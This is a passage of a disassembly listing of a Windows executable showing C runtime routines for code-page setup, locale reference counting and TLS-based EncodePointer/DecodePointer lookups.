loc_4119BA:                             ; CODE XREF: sub_41191F+91↑j
                push    0Dh
                call    sub_416839
                pop     ecx
                retn
sub_41191F      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_4119C3      proc near               ; CODE XREF: sub_411A3F+1B↓p
                                        ; sub_411C24+25↓p

var_10          = dword ptr -10h
var_8           = dword ptr -8
var_4           = byte ptr -4

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 10h
                push    ebx
                xor     ebx, ebx
                push    ebx
                lea     ecx, [ebp+var_10]
                call    sub_40E461
                mov     dword_42AE04, ebx
                cmp     esi, 0FFFFFFFEh
                jnz     short loc_411A00
                mov     dword_42AE04, 1
                call    ds:GetOEMCP

loc_4119F2:                             ; CODE XREF: sub_4119C3+52↓j
                                        ; sub_4119C3+69↓j
                cmp     [ebp+var_4], bl
                jz      short loc_411A3C
                mov     ecx, [ebp+var_8]
                and     dword ptr [ecx+70h], 0FFFFFFFDh
                jmp     short loc_411A3C
; ---------------------------------------------------------------------------

loc_411A00:                             ; CODE XREF: sub_4119C3+1D↑j
                cmp     esi, 0FFFFFFFDh
                jnz     short loc_411A17
                mov     dword_42AE04, 1
                call    ds:GetACP
                jmp     short loc_4119F2
; ---------------------------------------------------------------------------

loc_411A17:                             ; CODE XREF: sub_4119C3+40↑j
                cmp     esi, 0FFFFFFFCh
                jnz     short loc_411A2E
                mov     eax, [ebp+var_10]
                mov     eax, [eax+4]
                mov     dword_42AE04, 1
                jmp     short loc_4119F2
; ---------------------------------------------------------------------------

loc_411A2E:                             ; CODE XREF: sub_4119C3+57↑j
                cmp     [ebp+var_4], bl
                jz      short loc_411A3A
                mov     eax, [ebp+var_8]
                and     dword ptr [eax+70h], 0FFFFFFFDh

loc_411A3A:                             ; CODE XREF: sub_4119C3+6E↑j
                mov     eax, esi

loc_411A3C:                             ; CODE XREF: sub_4119C3+32↑j
                                        ; sub_4119C3+3B↑j
                pop     ebx
                leave
                retn
sub_4119C3      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_411A3F      proc near               ; CODE XREF: sub_411C24+5E↓p

var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
CPInfo          = _cpinfo ptr -18h
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 20h
                mov     eax, ___security_cookie
                xor     eax, ebp
                mov     [ebp+var_4], eax
                push    ebx
                mov     ebx, [ebp+arg_4]
                push    esi
                mov     esi, [ebp+arg_0]
                push    edi
                call    sub_4119C3
                mov     edi, eax
                xor     esi, esi
                mov     [ebp+arg_0], edi
                cmp     edi, esi
                jnz     short loc_411A78

loc_411A6A:                             ; CODE XREF: sub_411A3F+1CD↓j
                mov     eax, ebx
                call    sub_411728

loc_411A71:                             ; CODE XREF: sub_411A3F+176↓j
                xor     eax, eax
                jmp     loc_411C15
; ---------------------------------------------------------------------------

loc_411A78:                             ; CODE XREF: sub_411A3F+29↑j
                mov     [ebp+var_1C], esi
                xor     eax, eax

loc_411A7D:                             ; CODE XREF: sub_411A3F+55↓j
                cmp     dword_4255F0[eax], edi
                jz      loc_411B1A
                inc     [ebp+var_1C]
                add     eax, 30h
                cmp     eax, 0F0h
                jb      short loc_411A7D
                cmp     edi, 0FDE8h
                jz      loc_411C12
                cmp     edi, 0FDE9h
                jz      loc_411C12
                movzx   eax, di
                push    eax             ; CodePage
                call    ds:IsValidCodePage
                test    eax, eax
                jz      loc_411C12
                lea     eax, [ebp+CPInfo]
                push    eax             ; lpCPInfo
                push    edi             ; CodePage
                call    ds:GetCPInfo
                test    eax, eax
                jz      loc_411C06
                push    101h
                lea     eax, [ebx+1Ch]
                push    esi
                push    eax
                call    sub_413520
                xor     edx, edx
                inc     edx
                add     esp, 0Ch
                mov     [ebx+4], edi
                mov     [ebx+0Ch], esi
                cmp     [ebp+CPInfo.MaxCharSize], edx
                jbe     loc_411BEF
                cmp     [ebp+CPInfo.LeadByte], 0
                jz      loc_411BD0
                lea     esi, [ebp+CPInfo.LeadByte+1]

loc_411B04:                             ; CODE XREF: sub_411A3F+18B↓j
                mov     cl, [esi]
                test    cl, cl
                jz      loc_411BD0
                movzx   eax, byte ptr [esi-1]
                movzx   ecx, cl
                jmp     loc_411BC0
; ---------------------------------------------------------------------------

loc_411B1A:                             ; CODE XREF: sub_411A3F+44↑j
                push    101h
                lea     eax, [ebx+1Ch]
                push    esi
                push    eax
                call    sub_413520
                mov     ecx, [ebp+var_1C]
                add     esp, 0Ch
                imul    ecx, 30h
                mov     [ebp+var_20], esi
                lea     esi, unk_425600[ecx]
                mov     [ebp+var_1C], esi
                jmp     short loc_411B6A
; ---------------------------------------------------------------------------

loc_411B40:                             ; CODE XREF: sub_411A3F+12E↓j
                mov     al, [esi+1]
                test    al, al
                jz      short loc_411B6F
                movzx   edi, byte ptr [esi]
                movzx   eax, al
                jmp     short loc_411B61
; ---------------------------------------------------------------------------

loc_411B4F:                             ; CODE XREF: sub_411A3F+124↓j
                mov     eax, [ebp+var_20]
                mov     al, byte_4255EC[eax]
                or      [ebx+edi+1Dh], al
                movzx   eax, byte ptr [esi+1]
                inc     edi

loc_411B61:                             ; CODE XREF: sub_411A3F+10E↑j
                cmp     edi, eax
                jbe     short loc_411B4F
                mov     edi, [ebp+arg_0]
                inc     esi
                inc     esi

loc_411B6A:                             ; CODE XREF: sub_411A3F+FF↑j
                                        ; sub_411A3F+140↓j
                cmp     byte ptr [esi], 0
                jnz     short loc_411B40

loc_411B6F:                             ; CODE XREF: sub_411A3F+106↑j
                mov     esi, [ebp+var_1C]
                inc     [ebp+var_20]
                add     esi, 8
                cmp     [ebp+var_20], 4
                mov     [ebp+var_1C], esi
                jb      short loc_411B6A
                mov     eax, edi
                mov     [ebx+4], edi
                mov     dword ptr [ebx+8], 1
                call    sub_4116F9
                push    6
                mov     [ebx+0Ch], eax
                lea     eax, [ebx+10h]
                lea     ecx, unk_4255F4[ecx]
                pop     edx

loc_411BA1:                             ; CODE XREF: sub_411A3F+16D↓j
                mov     si, [ecx]
                inc     ecx
                mov     [eax], si
                inc     ecx
                inc     eax
                inc     eax
                dec     edx
                jnz     short loc_411BA1

loc_411BAE:                             ; CODE XREF: sub_411A3F+1C5↓j
                mov     esi, ebx
                call    sub_41178C
                jmp     loc_411A71
; ---------------------------------------------------------------------------

loc_411BBA:                             ; CODE XREF: sub_411A3F+183↓j
                or      byte ptr [ebx+eax+1Dh], 4
                inc     eax

loc_411BC0:                             ; CODE XREF: sub_411A3F+D6↑j
                cmp     eax, ecx
                jbe     short loc_411BBA
                inc     esi
                inc     esi
                cmp     byte ptr [esi-1], 0
                jnz     loc_411B04

loc_411BD0:                             ; CODE XREF: sub_411A3F+BC↑j
                                        ; sub_411A3F+C9↑j
                lea     eax, [ebx+1Eh]
                mov     ecx, 0FEh

loc_411BD8:                             ; CODE XREF: sub_411A3F+19E↓j
                or      byte ptr [eax], 8
                inc     eax
                dec     ecx
                jnz     short loc_411BD8
                mov     eax, [ebx+4]
                call    sub_4116F9
                mov     [ebx+0Ch], eax
                mov     [ebx+8], edx
                jmp     short loc_411BF2
; ---------------------------------------------------------------------------

loc_411BEF:                             ; CODE XREF: sub_411A3F+B2↑j
                mov     [ebx+8], esi

loc_411BF2:                             ; CODE XREF: sub_411A3F+1AE↑j
                xor     eax, eax
                movzx   ecx, ax
                mov     eax, ecx
                shl     ecx, 10h
                or      eax, ecx
                lea     edi, [ebx+10h]
                stosd
                stosd
                stosd
                jmp     short loc_411BAE
; ---------------------------------------------------------------------------

loc_411C06:                             ; CODE XREF: sub_411A3F+8E↑j
                cmp     dword_42AE04, esi
                jnz     loc_411A6A

loc_411C12:                             ; CODE XREF: sub_411A3F+5D↑j
                                        ; sub_411A3F+69↑j ...
                or      eax, 0FFFFFFFFh

loc_411C15:                             ; CODE XREF: sub_411A3F+34↑j
                mov     ecx, [ebp+var_4]
                pop     edi
                pop     esi
                xor     ecx, ebp
                pop     ebx
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                leave
                retn
sub_411A3F      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_411C24      proc near               ; CODE XREF: sub_411DBE+B↓p

var_24          = dword ptr -24h
var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
ms_exc          = CPPEH_RECORD ptr -18h
arg_0           = dword ptr  8

; FUNCTION CHUNK AT 00411D90 SIZE 0000002E BYTES

                push    14h
                push    offset stru_422DA8
                call    __SEH_prolog4
                or      [ebp+var_20], 0FFFFFFFFh
                call    sub_412405
                mov     edi, eax
                mov     [ebp+var_24], edi
                call    sub_41191F
                mov     ebx, [edi+68h]
                mov     esi, [ebp+arg_0]
                call    sub_4119C3
                mov     [ebp+arg_0], eax
                cmp     eax, [ebx+4]
                jz      loc_411DB1
                push    220h
                call    sub_412BB3
                pop     ecx
                mov     ebx, eax
                test    ebx, ebx
                jz      loc_411DB5
                mov     ecx, 88h
                mov     esi, [edi+68h]
                mov     edi, ebx
                rep movsd
                and     dword ptr [ebx], 0
                push    ebx
                push    [ebp+arg_0]
                call    sub_411A3F
                pop     ecx
                pop     ecx
                mov     [ebp+var_20], eax
                test    eax, eax
                jnz     loc_411D90
                mov     esi, [ebp+var_24]
                push    dword ptr [esi+68h] ; lpAddend
                call    ds:InterlockedDecrement
                test    eax, eax
                jnz     short loc_411CB5
                mov     eax, [esi+68h]
                cmp     eax, offset unk_4251C0
                jz      short loc_411CB5
                push    eax             ; lpMem
                call    sub_40FD55
                pop     ecx

loc_411CB5:                             ; CODE XREF: sub_411C24+7E↑j
                                        ; sub_411C24+88↑j
                mov     [esi+68h], ebx
                push    ebx             ; lpAddend
                mov     edi, ds:InterlockedIncrement
                call    edi ; InterlockedIncrement
                test    byte ptr [esi+70h], 2
                jnz     loc_411DB5
                test    byte ptr dword_4256E4, 1
                jnz     loc_411DB5
                push    0Dh
                call    sub_416913
                pop     ecx
                and     [ebp+ms_exc.registration.TryLevel], 0
                mov     eax, [ebx+4]
                mov     dword_42AE14, eax
                mov     eax, [ebx+8]
                mov     dword_42AE18, eax
                mov     eax, [ebx+0Ch]
                mov     dword_42AE1C, eax
                xor     eax, eax

loc_411CFE:                             ; CODE XREF: sub_411C24+F0↓j
                mov     [ebp+var_1C], eax
                cmp     eax, 5
                jge     short loc_411D16
                mov     cx, [ebx+eax*2+10h]
                mov     word_42AE08[eax*2], cx
                inc     eax
                jmp     short loc_411CFE
; ---------------------------------------------------------------------------

loc_411D16:                             ; CODE XREF: sub_411C24+E0↑j
                xor     eax, eax

loc_411D18:                             ; CODE XREF: sub_411C24+109↓j
                mov     [ebp+var_1C], eax
                cmp     eax, 101h
                jge     short loc_411D2F
                mov     cl, [eax+ebx+1Ch]
                mov     byte_4253E0[eax], cl
                inc     eax
                jmp     short loc_411D18
; ---------------------------------------------------------------------------

loc_411D2F:                             ; CODE XREF: sub_411C24+FC↑j
                xor     eax, eax

loc_411D31:                             ; CODE XREF: sub_411C24+125↓j
                mov     [ebp+var_1C], eax
                cmp     eax, 100h
                jge     short loc_411D4B
                mov     cl, [eax+ebx+11Dh]
                mov     byte_4254E8[eax], cl
                inc     eax
                jmp     short loc_411D31
; ---------------------------------------------------------------------------

loc_411D4B:                             ; CODE XREF: sub_411C24+115↑j
                push    lpAddend        ; lpAddend
                call    ds:InterlockedDecrement
                test    eax, eax
                jnz     short loc_411D6E
                mov     eax, lpAddend
                cmp     eax, offset unk_4251C0
                jz      short loc_411D6E
                push    eax             ; lpMem
                call    sub_40FD55
                pop     ecx

loc_411D6E:                             ; CODE XREF: sub_411C24+135↑j
                                        ; sub_411C24+141↑j
                mov     lpAddend, ebx
                push    ebx             ; lpAddend
                call    edi ; InterlockedIncrement
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                call    loc_411D85
; ---------------------------------------------------------------------------

loc_411D83:                             ; CODE XREF: sub_411C24+169↓j
                jmp     short loc_411DB5
; ---------------------------------------------------------------------------

loc_411D85:                             ; CODE XREF: sub_411C24+15A↑j
                                        ; DATA XREF: .rdata:stru_422DA8↓o
                push    0Dh
                call    sub_416839
                pop     ecx
                retn
sub_411C24      endp

; ---------------------------------------------------------------------------
                jmp     short loc_411DB5
; ---------------------------------------------------------------------------
; START OF FUNCTION CHUNK FOR sub_411C24

loc_411D90:                             ; CODE XREF: sub_411C24+6A↑j
                cmp     eax, 0FFFFFFFFh
                jnz     short loc_411DB5
                cmp     ebx, offset unk_4251C0
                jz      short loc_411DA4
                push    ebx             ; lpMem
                call    sub_40FD55
                pop     ecx

loc_411DA4:                             ; CODE XREF: sub_411C24+177↑j
                call    sub_41090E
                mov     dword ptr [eax], 16h
                jmp     short loc_411DB5
; ---------------------------------------------------------------------------

loc_411DB1:                             ; CODE XREF: sub_411C24+30↑j
                and     [ebp+var_20], 0

loc_411DB5:                             ; CODE XREF: sub_411C24+45↑j
                                        ; sub_411C24+A1↑j ...
                mov     eax, [ebp+var_20]
                call    __SEH_epilog4
                retn
; END OF FUNCTION CHUNK FOR sub_411C24

; =============== S U B R O U T I N E =======================================


sub_411DBE      proc near               ; CODE XREF: sub_41763E+9↓p
                                        ; sub_4178B6+15↓p
                                        ; DATA XREF: ...
                cmp     dword_42DB34, 0
                jnz     short loc_411DD9
                push    0FFFFFFFDh
                call    sub_411C24
                pop     ecx
                mov     dword_42DB34, 1

loc_411DD9:                             ; CODE XREF: sub_411DBE+7↑j
                xor     eax, eax
                retn
sub_411DBE      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_411DDC(LPVOID lpMem)
sub_411DDC      proc near               ; CODE XREF: sub_41204D+31↓p
                                        ; sub_41241F+F6↓p

lpMem           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ebx
                push    esi
                mov     esi, [ebp+lpMem]
                mov     eax, [esi+0BCh]
                xor     ebx, ebx
                push    edi
                cmp     eax, ebx
                jz      short loc_411E62
                cmp     eax, offset off_425ED8
                jz      short loc_411E62
                mov     eax, [esi+0B0h]
                cmp     eax, ebx
                jz      short loc_411E62
                cmp     [eax], ebx
                jnz     short loc_411E62
                mov     eax, [esi+0B8h]
                cmp     eax, ebx
                jz      short loc_411E29
                cmp     [eax], ebx
                jnz     short loc_411E29
                push    eax             ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+0BCh]
                call    sub_419605
                pop     ecx
                pop     ecx

loc_411E29:                             ; CODE XREF: sub_411DDC+34↑j
                                        ; sub_411DDC+38↑j
                mov     eax, [esi+0B4h]
                cmp     eax, ebx
                jz      short loc_411E4A
                cmp     [eax], ebx
                jnz     short loc_411E4A
                push    eax             ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+0BCh]
                call    sub_4195C0
                pop     ecx
                pop     ecx

loc_411E4A:                             ; CODE XREF: sub_411DDC+55↑j
                                        ; sub_411DDC+59↑j
                push    dword ptr [esi+0B0h] ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+0BCh] ; lpMem
                call    sub_40FD55
                pop     ecx
                pop     ecx

loc_411E62:                             ; CODE XREF: sub_411DDC+15↑j
                                        ; sub_411DDC+1C↑j ...
                mov     eax, [esi+0C0h]
                cmp     eax, ebx
                jz      short loc_411EB0
                cmp     [eax], ebx
                jnz     short loc_411EB0
                mov     eax, [esi+0C4h]
                sub     eax, 0FEh
                push    eax             ; lpMem
                call    sub_40FD55
                mov     eax, [esi+0CCh]
                mov     edi, 80h
                sub     eax, edi
                push    eax             ; lpMem
                call    sub_40FD55
                mov     eax, [esi+0D0h]
                sub     eax, edi
                push    eax             ; lpMem
                call    sub_40FD55
                push    dword ptr [esi+0C0h] ; lpMem
                call    sub_40FD55
                add     esp, 10h

loc_411EB0:                             ; CODE XREF: sub_411DDC+8E↑j
                                        ; sub_411DDC+92↑j
                lea     edi, [esi+0D4h]
                mov     eax, [edi]
                cmp     eax, offset off_425E18
                jz      short loc_411ED6
                cmp     [eax+0B4h], ebx
                jnz     short loc_411ED6
                push    eax
                call    sub_41942B
                push    dword ptr [edi] ; lpMem
                call    sub_40FD55
                pop     ecx
                pop     ecx

loc_411ED6:                             ; CODE XREF: sub_411DDC+E1↑j
                                        ; sub_411DDC+E9↑j
                lea     edi, [esi+50h]
                mov     [ebp+lpMem], 6

loc_411EE0:                             ; CODE XREF: sub_411DDC+13B↓j
                cmp     dword ptr [edi-8], offset unk_4256E8
                jz      short loc_411EFA
                mov     eax, [edi]
                cmp     eax, ebx
                jz      short loc_411EFA
                cmp     [eax], ebx
                jnz     short loc_411EFA
                push    eax             ; lpMem
                call    sub_40FD55
                pop     ecx

loc_411EFA:                             ; CODE XREF: sub_411DDC+10B↑j
                                        ; sub_411DDC+111↑j ...
                cmp     [edi-4], ebx
                jz      short loc_411F11
                mov     eax, [edi+4]
                cmp     eax, ebx
                jz      short loc_411F11
                cmp     [eax], ebx
                jnz     short loc_411F11
                push    eax             ; lpMem
                call    sub_40FD55
                pop     ecx

loc_411F11:                             ; CODE XREF: sub_411DDC+121↑j
                                        ; sub_411DDC+128↑j ...
                add     edi, 10h
                dec     [ebp+lpMem]
                jnz     short loc_411EE0
                push    esi             ; lpMem
                call    sub_40FD55
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                pop     ebp
                retn
sub_411DDC      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_411F25(volatile LONG *lpAddend)
sub_411F25      proc near               ; CODE XREF: sub_41204D+12↓p
                                        ; sub_4122A5+B7↓p

lpAddend        = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ebx
                push    esi
                mov     esi, ds:InterlockedIncrement
                push    edi
                mov     edi, [ebp+lpAddend]
                push    edi             ; lpAddend
                call    esi ; InterlockedIncrement
                mov     eax, [edi+0B0h]
                test    eax, eax
                jz      short loc_411F46
                push    eax             ; lpAddend
                call    esi ; InterlockedIncrement

loc_411F46:                             ; CODE XREF: sub_411F25+1C↑j
                mov     eax, [edi+0B8h]
                test    eax, eax
                jz      short loc_411F53
                push    eax             ; lpAddend
                call    esi ; InterlockedIncrement

loc_411F53:                             ; CODE XREF: sub_411F25+29↑j
                mov     eax, [edi+0B4h]
                test    eax, eax
                jz      short loc_411F60
                push    eax             ; lpAddend
                call    esi ; InterlockedIncrement

loc_411F60:                             ; CODE XREF: sub_411F25+36↑j
                mov     eax, [edi+0C0h]
                test    eax, eax
                jz      short loc_411F6D
                push    eax             ; lpAddend
                call    esi ; InterlockedIncrement

loc_411F6D:                             ; CODE XREF: sub_411F25+43↑j
                lea     ebx, [edi+50h]
                mov     [ebp+lpAddend], 6

loc_411F77:                             ; CODE XREF: sub_411F25+7A↓j
                cmp     dword ptr [ebx-8], offset unk_4256E8
                jz      short loc_411F89
                mov     eax, [ebx]
                test    eax, eax
                jz      short loc_411F89
                push    eax             ; lpAddend
                call    esi ; InterlockedIncrement

loc_411F89:                             ; CODE XREF: sub_411F25+59↑j
                                        ; sub_411F25+5F↑j
                cmp     dword ptr [ebx-4], 0
                jz      short loc_411F99
                mov     eax, [ebx+4]
                test    eax, eax
                jz      short loc_411F99
                push    eax             ; lpAddend
                call    esi ; InterlockedIncrement

loc_411F99:                             ; CODE XREF: sub_411F25+68↑j
                                        ; sub_411F25+6F↑j
                add     ebx, 10h
                dec     [ebp+lpAddend]
                jnz     short loc_411F77
                mov     eax, [edi+0D4h]
                add     eax, 0B4h
                push    eax             ; lpAddend
                call    esi ; InterlockedIncrement
                pop     edi
                pop     esi
                pop     ebx
                pop     ebp
                retn
sub_411F25      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_411FB4(volatile LONG *lpAddend)
sub_411FB4      proc near               ; CODE XREF: sub_41204D+1D↓p
                                        ; sub_41241F+DA↓p

lpAddend        = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    edi
                mov     edi, [ebp+lpAddend]
                test    edi, edi
                jz      loc_412048
                push    ebx
                push    esi
                mov     esi, ds:InterlockedDecrement
                push    edi             ; lpAddend
                call    esi ; InterlockedDecrement
                mov     eax, [edi+0B0h]
                test    eax, eax
                jz      short loc_411FDD
                push    eax             ; lpAddend
                call    esi ; InterlockedDecrement

loc_411FDD:                             ; CODE XREF: sub_411FB4+24↑j
                mov     eax, [edi+0B8h]
                test    eax, eax
                jz      short loc_411FEA
                push    eax             ; lpAddend
                call    esi ; InterlockedDecrement

loc_411FEA:                             ; CODE XREF: sub_411FB4+31↑j
                mov     eax, [edi+0B4h]
                test    eax, eax
                jz      short loc_411FF7
                push    eax             ; lpAddend
                call    esi ; InterlockedDecrement

loc_411FF7:                             ; CODE XREF: sub_411FB4+3E↑j
                mov     eax, [edi+0C0h]
                test    eax, eax
                jz      short loc_412004
                push    eax             ; lpAddend
                call    esi ; InterlockedDecrement

loc_412004:                             ; CODE XREF: sub_411FB4+4B↑j
                lea     ebx, [edi+50h]
                mov     [ebp+lpAddend], 6

loc_41200E:                             ; CODE XREF: sub_411FB4+82↓j
                cmp     dword ptr [ebx-8], offset unk_4256E8
                jz      short loc_412020
                mov     eax, [ebx]
                test    eax, eax
                jz      short loc_412020
                push    eax             ; lpAddend
                call    esi ; InterlockedDecrement

loc_412020:                             ; CODE XREF: sub_411FB4+61↑j
                                        ; sub_411FB4+67↑j
                cmp     dword ptr [ebx-4], 0
                jz      short loc_412030
                mov     eax, [ebx+4]
                test    eax, eax
                jz      short loc_412030
                push    eax             ; lpAddend
                call    esi ; InterlockedDecrement

loc_412030:                             ; CODE XREF: sub_411FB4+70↑j
                                        ; sub_411FB4+77↑j
                add     ebx, 10h
                dec     [ebp+lpAddend]
                jnz     short loc_41200E
                mov     eax, [edi+0D4h]
                add     eax, 0B4h
                push    eax             ; lpAddend
                call    esi ; InterlockedDecrement
                pop     esi
                pop     ebx

loc_412048:                             ; CODE XREF: sub_411FB4+B↑j
                mov     eax, edi
                pop     edi
                pop     ebp
                retn
sub_411FB4      endp


; =============== S U B R O U T I N E =======================================


sub_41204D      proc near               ; CODE XREF: sub_41208B+54↓p
                test    edi, edi
                jz      short loc_412088
                test    eax, eax
                jz      short loc_412088
                push    esi
                mov     esi, [eax]
                cmp     esi, edi
                jz      short loc_412084
                push    edi             ; lpAddend
                mov     [eax], edi
                call    sub_411F25
                pop     ecx
                test    esi, esi
                jz      short loc_412084
                push    esi             ; lpAddend
                call    sub_411FB4
                cmp     dword ptr [esi], 0
                pop     ecx
                jnz     short loc_412084
                cmp     esi, offset unk_4256F0
                jz      short loc_412084
                push    esi             ; lpMem
                call    sub_411DDC
                pop     ecx

loc_412084:                             ; CODE XREF: sub_41204D+D↑j
                                        ; sub_41204D+1A↑j ...
                mov     eax, edi
                pop     esi
                retn
; ---------------------------------------------------------------------------

loc_412088:                             ; CODE XREF: sub_41204D+2↑j
                                        ; sub_41204D+6↑j
                xor     eax, eax
                retn
sub_41204D      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41208B      proc near               ; CODE XREF: sub_40E461+3B↑p

var_1C          = dword ptr -1Ch
ms_exc          = CPPEH_RECORD ptr -18h

                push    0Ch
                push    offset stru_422DC8
                call    __SEH_prolog4
                call    sub_412405
                mov     esi, eax
                mov     eax, dword_4256E4
                test    [esi+70h], eax
                jz      short loc_4120CA
                cmp     dword ptr [esi+6Ch], 0
                jz      short loc_4120CA
                call    sub_412405
                mov     esi, [eax+6Ch]

loc_4120B6:                             ; CODE XREF: sub_41208B:loc_4120F3↓j
                test    esi, esi
                jnz     short loc_4120C2
                push    20h
                call    sub_412D65
                pop     ecx

loc_4120C2:                             ; CODE XREF: sub_41208B+2D↑j
                mov     eax, esi
                call    __SEH_epilog4
                retn
; ---------------------------------------------------------------------------

loc_4120CA:                             ; CODE XREF: sub_41208B+1B↑j
                                        ; sub_41208B+21↑j
                push    0Ch
                call    sub_416913
                pop     ecx
                and     [ebp+ms_exc.registration.TryLevel], 0
                lea     eax, [esi+6Ch]
                mov     edi, off_4257C8
                call    sub_41204D
                mov     [ebp+var_1C], eax
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                call    loc_4120F5
; ---------------------------------------------------------------------------

loc_4120F3:                             ; CODE XREF: sub_41208B+75↓j
                jmp     short loc_4120B6
; ---------------------------------------------------------------------------

loc_4120F5:                             ; CODE XREF: sub_41208B+63↑j
                                        ; DATA XREF: .rdata:stru_422DC8↓o
                push    0Ch
                call    sub_416839
                pop     ecx
                mov     esi, [ebp+var_1C]
                retn
sub_41208B      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_412101      proc near               ; CODE XREF: sub_40E82E+89↑p
                                        ; sub_40E82E+97↑p ...

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                push    dwTlsIndex      ; dwTlsIndex
                mov     esi, ds:TlsGetValue
                call    esi ; TlsGetValue
                test    eax, eax
                jz      short loc_41213A
                mov     eax, dword_4257D8
                cmp     eax, 0FFFFFFFFh
                jz      short loc_41213A
                push    eax
                push    dwTlsIndex      ; dwTlsIndex
                call    esi ; TlsGetValue
                call    eax
                test    eax, eax
                jz      short loc_41213A
                mov     eax, [eax+1F8h]
                jmp     short loc_412161
; ---------------------------------------------------------------------------

loc_41213A:                             ; CODE XREF: sub_412101+16↑j
                                        ; sub_412101+20↑j ...
                mov     esi, offset aKernel32Dll_0 ; "KERNEL32.DLL"
                push    esi             ; lpModuleName
                call    ds:GetModuleHandleW
                test    eax, eax
                jnz     short loc_412155
                push    esi             ; lpModuleName
                call    sub_412D35
                pop     ecx
                test    eax, eax
                jz      short loc_41216D

loc_412155:                             ; CODE XREF: sub_412101+47↑j
                push    offset aEncodepointer ; "EncodePointer"
                push    eax             ; hModule
                call    ds:GetProcAddress

loc_412161:                             ; CODE XREF: sub_412101+37↑j
                test    eax, eax
                jz      short loc_41216D
                push    [ebp+arg_0]
                call    eax
                mov     [ebp+arg_0], eax

loc_41216D:                             ; CODE XREF: sub_412101+52↑j
                                        ; sub_412101+62↑j
                mov     eax, [ebp+arg_0]
                pop     esi
                pop     ebp
                retn
sub_412101      endp


; =============== S U B R O U T I N E =======================================


sub_412173      proc near               ; CODE XREF: sub_412EA9+75↓p
                                        ; sub_412EA9+8B↓p ...
                push    0
                call    sub_412101
                pop     ecx
                retn
sub_412173      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41217C      proc near               ; CODE XREF: sub_40E82E+F↑p
                                        ; sub_40E82E+1F↑p ...

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                push    dwTlsIndex      ; dwTlsIndex
                mov     esi, ds:TlsGetValue
                call    esi ; TlsGetValue
                test    eax, eax
                jz      short loc_4121B5
                mov     eax, dword_4257D8
                cmp     eax, 0FFFFFFFFh
                jz      short loc_4121B5
                push    eax
                push    dwTlsIndex      ; dwTlsIndex
                call    esi ; TlsGetValue
                call    eax
                test    eax, eax
                jz      short loc_4121B5
                mov     eax, [eax+1FCh]
                jmp     short loc_4121DC
; ---------------------------------------------------------------------------

loc_4121B5:                             ; CODE XREF: sub_41217C+16↑j
                                        ; sub_41217C+20↑j ...
                mov     esi, offset aKernel32Dll_0 ; "KERNEL32.DLL"
                push    esi             ; lpModuleName
                call    ds:GetModuleHandleW
                test    eax, eax
                jnz     short loc_4121D0
                push    esi             ; lpModuleName
                call    sub_412D35
                pop     ecx
                test    eax, eax
                jz      short loc_4121E8

loc_4121D0:                             ; CODE XREF: sub_41217C+47↑j
                push    offset aDecodepointer ; "DecodePointer"
                push    eax             ; hModule
                call    ds:GetProcAddress

loc_4121DC:                             ; CODE XREF: sub_41217C+37↑j
                test    eax, eax
                jz      short loc_4121E8
                push    [ebp+arg_0]
                call    eax
                mov     [ebp+arg_0], eax

loc_4121E8:                             ; CODE XREF: sub_41217C+52↑j
                                        ; sub_41217C+62↑j
                mov     eax, [ebp+arg_0]
                pop     esi
                pop     ebp
                retn
sub_41217C      endp


; =============== S U B R O U T I N E =======================================


sub_4121EE      proc near               ; DATA XREF: sub_4125BC+93↓o
                call    ds:TlsAlloc
                retn    4
sub_4121EE      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_4121F7      proc near               ; CODE XREF: StartAddress+11↑p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    [ebp+arg_0]
                push    dwTlsIndex      ; dwTlsIndex
                call    ds:TlsGetValue
                call    eax
                pop     ebp
                retn    4
sub_4121F7      endp


; =============== S U B R O U T I N E =======================================


sub_412211      proc near               ; CODE XREF: StartAddress+B↑p
                                        ; StartAddress+1E↑p
                mov     eax, dword_4257D8
                retn
sub_412211      endp


; =============== S U B R O U T I N E =======================================


sub_412217      proc near               ; CODE XREF: StartAddress+6↑p
                                        ; sub_40EA6D+31↑p ...
                mov     edi, edi
                push    esi
                push    dwTlsIndex      ; dwTlsIndex
                call    ds:TlsGetValue
                mov     esi, eax
                test    esi, esi
                jnz     short loc_412247
                push    lpTlsValue
                call    sub_41217C
                pop     ecx
                mov     esi, eax
                push    esi             ; lpTlsValue
                push    dwTlsIndex      ; dwTlsIndex
                call    ds:TlsSetValue

loc_412247:                             ; CODE XREF: sub_412217+13↑j
                mov     eax, esi
                pop     esi
                retn
sub_412217      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41224B      proc near               ; CODE XREF: StartAddress+24↑p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    [ebp+arg_4]
